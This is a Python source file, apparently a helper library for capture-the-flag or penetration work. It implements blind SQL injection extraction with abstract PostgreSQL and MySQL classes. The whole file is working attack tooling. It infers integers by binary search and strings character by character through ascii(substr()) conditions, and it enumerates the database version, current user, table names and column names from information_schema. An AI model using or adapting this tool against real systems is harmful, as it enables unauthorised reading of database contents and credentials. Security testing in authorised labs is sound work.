from abc import ABC, abstractmethod
import sys
import string

# TODO: add blind/reflected option
# TODO: binary search instead of bruteforce
class SQLi(ABC):

    @staticmethod
    def build_query(column: str, table=None, condition=None, offset=None):
        condition = "" if not condition else f" WHERE {condition}"
        offset = "" if offset is None else f" OFFSET {offset}"
        table = "" if not table else f" FROM {table}"
        return f"SELECT {column}{table}{condition} LIMIT 1{offset}"

    def extract_int(self, column: str, table=None, condition=None, offset=None, verbose=False, binary_search=True):

        query = self.build_query(column, table, condition, offset)

        if self.blind_sqli(f"({query})=0"):
            return 0

        if not binary_search:
            cur_int = 1
            while self.blind_sqli(f"({query})>{cur_int}"):
                cur_int += 1

            return cur_int
        else:
            min_value = 1
            max_value = 1

            while self.blind_sqli(f"({query})>{max_value}"):
                min_value = max_value + 1
                max_value = max_value * 2

            max_value = max_value - 1
            while True:
                cur_int = (min_value + max_value) // 2
                if self.blind_sqli(f"({query})>{cur_int}"):
                    min_value = cur_int + 1
                elif self.blind_sqli(f"({query})<{cur_int}"):
                    max_value = cur_int - 1
                else:
                    return cur_int

    def extract_multiple_ints(self, column: str, table=None, condition=None, verbose=False):
        row_count = self.extract_int(f"COUNT({column})", table=table, condition=condition, verbose=verbose)
        if verbose:
            print(f"Fetching {row_count} rows")

        rows = []
        for i in range(0, row_count):
            rows.append(self.extract_int(column, table, condition, i, verbose=verbose))

        return rows

    def extract_string(self, column: str, table=None, condition=None, offset=None, max_length=None, verbose=False, charset=string.printable):

        if max_length is None:
            max_length = self.extract_int(f"LENGTH({column})", table, condition, offset, verbose=verbose)
            if verbose:
                print("Fetched length:", max_length)

        cur_str = ""
        while True:
            found = False
            query = self.build_query(f"ascii(substr({column},{len(cur_str) + 1},1))", table, condition, offset)
            for c in charset:
                if self.blind_sqli(f"({query})={ord(c)}"):
                    found = True
                    cur_str += c
                    if verbose:
                        sys.stdout.write(c)
                        sys.stdout.flush()
                    break
            if not found or (max_length is not None and len(cur_str) >= max_length):
                break

        if verbose:
            print()

        return cur_str

    def extract_multiple_strings(self, column: str, table=None, condition=None, verbose=False, charset=string.printable):
        row_count = self.extract_int(f"COUNT({column})", table=table, condition=condition, verbose=verbose)
        if verbose:
            print(f"Fetching {row_count} rows")

        rows = []
        for i in range(0, row_count):
            rows.append(self.extract_string(column, table, condition, i, verbose=verbose, charset=charset))

        return rows

    @abstractmethod
    def get_database_version(self, verbose=False):
        pass

    @abstractmethod
    def get_current_user(self, verbose=False):
        pass

    @abstractmethod
    def get_current_database(self, verbose=False):
        pass

    @abstractmethod
    def blind_sqli(self, condition: str, verbose=False) -> bool:
        pass

    @abstractmethod
    def get_table_names(self, schema: str, verbose=False):
        pass

    @abstractmethod
    def get_column_names(self, table: str, schema: str, verbose=False):
        pass


class PostgreSQLi(SQLi, ABC):
    def get_database_version(self, verbose=False):
        return self.extract_string("VERSION()", verbose=verbose)

    def get_current_user(self, verbose=False):
        return self.extract_string("current_user", verbose=verbose)

    def get_current_database(self, verbose=False):
        return self.extract_string("current_database()", verbose=verbose)

    def get_table_names(self, schema: str = "public", verbose=False):
        return self.extract_multiple_strings("table_name", "information_schema.tables", f"table_schema='{schema}'",
                                             verbose=verbose)

    def get_column_names(self, table: str, schema: str = "public", verbose=False):
        return self.extract_multiple_strings("column_name", "information_schema.columns",
                                             f"table_schema='{schema}' AND table_name='{table}'",
                                             verbose=verbose)


class MySQLi(SQLi, ABC):
    def get_database_version(self, verbose=False):
        return self.extract_string("VERSION()", verbose=verbose)

    def get_current_user(self, verbose=False):
        return self.extract_string("USER()", verbose=verbose)

    def get_current_database(self, verbose=False):
        return self.extract_string("DATABASE()", verbose=verbose)

    def get_table_names(self, schema: str, verbose=False):
        return self.extract_multiple_strings("table_name", "information_schema.tables", f"table_schema='{schema}'",
                                             verbose=verbose)

    def get_column_names(self, table: str, schema: str, verbose=False):
        return self.extract_multiple_strings("column_name", "information_schema.columns",
                                             f"table_schema='{schema}' AND table_name='{table}'",
                                             verbose=verbose)
